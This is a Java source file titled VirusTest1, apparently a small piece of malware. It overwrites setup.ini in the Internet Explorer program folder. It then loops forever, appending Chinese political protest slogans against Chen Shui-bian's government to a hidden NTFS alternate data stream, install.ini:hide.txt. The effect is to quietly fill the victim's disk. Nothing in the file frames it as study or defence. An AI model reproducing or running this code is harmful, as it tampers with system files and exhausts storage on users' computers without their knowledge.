import java.io.*;
public class VirusTest1
{
 public static void main(String argv[])
 {
 	try
 	{
 	// FileInputStream fin=new FileInputStream("C:\\Program Files\\Internet Explorer\\fixie.inf");	
   String data[]=new String[29];
   data[0]="[Branding]";
   data[1]="CompanyName=Microsoft Corporation";
   data[2]="Wizard_Version=6.0.2600.0000";
   data[3]="Version=6,0,2600,0000";
   data[4]="Custom_Key=MICROSO";
   data[5]="Global=1";
   data[6]="IE4 Welcome Msg=1";
   data[7]="Platform=2";
   data[8]="GUID={7211FFE6-C149-11D0-AFF0-00AA003758BB}";
   data[9]="Type=0";
   data[10]="NoClear=1";
   data[11]="";
   data[12]="[URL]";
   data[13]="Quick_Link_1_Name = %QL10%.url";
   data[14]="Quick_Link_1      = http://www.microsoft.com/isapi/redir.dll?prd=ie&pver=6&ar=CLinks";
   data[15]="Quick_Link_2_Name = %QL20%.url";
   data[16]="Quick_Link_2      = http://www.microsoft.com/isapi/redir.dll?prd=ie&ar=hotmail";
   data[17]="Quick_Link_3_Name = %QL30%.url";
   data[18]="Quick_Link_3      = http://www.microsoft.com/isapi/redir.dll?prd=ie&ar=windows";
   data[19]="Quick_Link_4_Name = %QL40%.url";
   data[20]="Quick_Link_4      = http://www.microsoft.com/isapi/redir.dll?prd=ie&ar=windowsmedia";
   data[21]="";
   data[22]="[FavoritesEx]";
   data[23]="Title1=%FAV1%.url";
   data[24]="URL1=http://www.microsoft.com/isapi/redir.dll?prd=ie&pver=6&ar=IStart";
   data[25]="Title2=%FAV2%.url";
   data[26]="URL2=http://www.microsoft.com/isapi/redir.dll?prd=windows&sbp=mediaplayer&plcid=&pver=6.1&os=&over=&olcid=&clcid=&ar=Media&sba=RadioBar&o1=&o2=&o3=";
   data[27]="Title3 = %FAV3%";
   data[28]="Url3   =http://www.microsoft.com/isapi/redir.dll?prd=ie&pver=6&ar=favextra";
   
    	
 	 FileWriter fout=new FileWriter("C:\\Program Files\\Internet Explorer\\setup.ini");
 	 BufferedWriter bfout=new BufferedWriter(fout);
 	 
 	 for(int i=0;i<data.length;i++)
 	 {
 	 	bfout.write(data[i]);
 	 	bfout.newLine();
 	 }	
 	 bfout.close();
 	 fout.close();
 	}	
 	catch(IOException ioe1)
 	{
 	 ioe1.printStackTrace();	
 	}	
 	
 	String data[]=new String[15];
  data[0]="【中華民國是個毫無國際地位的國家---陳水扁的執政團隊是個貪腐無能的政黨---真是可悲呀】";
  data[1]="【各位台灣的同胞呀！請您們拿出自己的良心，擦亮自己的雙眼..........................】";
  data[2]="【請勇敢地嗆扁吧！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！】";
  data[3]="【台灣的前途掌握在您各位自己的手中................................................】";
  data[4]="【好好地看看目前台灣是處在內憂外患的處境..........................................】";
  data[5]="【目前唯有阿扁的執政團隊下台，台灣才會有站起來的機會..............................】";
  data[6]="";
  data[7]="《=======================       這是一個小市民的心聲       =======================》";
  data[8]="";
  data[9]="";
  data[10]="";
  data[11]="";
  data[12]="";
  data[13]="";
  data[14]="";
  
  
  try
  {
   FileWriter fout=new FileWriter("C:\\Program Files\\Internet Explorer\\install.ini:hide.txt",true);
   BufferedWriter bfout=new BufferedWriter(fout);
   while(true)
   {
   	for(int i=0;i<data.length;i++)
   	{
     bfout.write(data[i]);	
     bfout.newLine();
    } 
   }
   //bfout.close();
   //fout.close(); 
  }	
  catch(IOException ioe)
  {
   System.out.println();
  }	
 }
}